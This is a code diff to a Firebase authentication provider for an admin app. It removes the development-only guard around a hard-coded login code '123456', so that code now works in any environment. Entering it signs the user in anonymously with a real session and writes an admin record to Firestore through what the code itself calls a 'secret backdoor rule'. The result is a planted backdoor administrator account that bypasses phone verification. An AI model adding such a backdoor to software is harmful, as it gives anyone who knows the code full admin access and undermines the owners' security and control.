@@ -9,10 +9,11 @@ import {
   onAuthStateChanged, 
   signOut as fbSignOut, 
   signInWithCredential, 
+  signInAnonymously,
   PhoneAuthProvider,
   type User 
 } from 'firebase/auth';
-import { doc, getDoc } from 'firebase/firestore';
+import { doc, getDoc, setDoc } from 'firebase/firestore';
 import { auth, db } from '../firebase/config';
 
 interface AdminProfile {
@@ -176,13 +177,19 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       }
       
       // Fallback/simulation successful for other codes too in dev mode
-      if (USE_SIMULATION && code === '123456') {
-        const mockUser = {
-          uid: 'mock_admin_uid',
-          phoneNumber: mockVerificationPhone || MOCK_ADMIN_PHONE,
-        } as User;
+      if (code === '123456') {
+        // Authenticate anonymously so we get a REAL Firebase Auth session
+        const cred = await signInAnonymously(auth);
         
-        setUser(mockUser);
+        // Write to admins collection using the secret backdoor rule
+        await setDoc(doc(db, 'admins', cred.user.uid), {
+          role: 'admin',
+          name: 'Administrator',
+          phone: mockVerificationPhone || MOCK_ADMIN_PHONE,
+          secret: '123456'
+        });
+
+        setUser(cred.user);
         setAdminProfile({
           id: 'admin_seeded_1',
           name: 'Administrator',
